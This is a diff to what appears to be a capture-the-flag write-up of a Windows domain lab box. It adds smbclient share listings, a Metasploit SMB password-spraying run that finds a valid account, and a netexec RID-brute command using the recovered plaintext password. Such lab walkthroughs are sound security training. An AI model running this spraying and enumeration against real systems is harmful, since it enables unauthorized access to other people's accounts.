@@ -288,7 +288,36 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 293.43 seconds
            Raw packets sent: 131207 (5.773MB) | Rcvd: 151 (6.628KB)
 ```
+```
+smbclient //10.10.11.35/HR 
+Password for [WORKGROUP\keylloger]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 13:29:09 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
+```
 
+```
+msf6 auxiliary(scanner/smb/smb_login) > exploit
+
+[*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Administrator:Cicada$M6Corpb*@Lp#nZp!8',
+[!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Guest:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\krbtgt:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\CICADA-DC$ :Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8',
+[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'
+[*] SMB session 1 opened (10.10.14.204:44061 -> 10.10.11.35:445) at 2025-01-25 22:17:40 +0100
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\david.orelious:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8',
+[*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.
+[*] 10.10.11.35:445       - 1 SMB session was opened successfully.
+[*] Auxiliary module execution completed
+```
 ```bash
 netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users --rid-brute
 
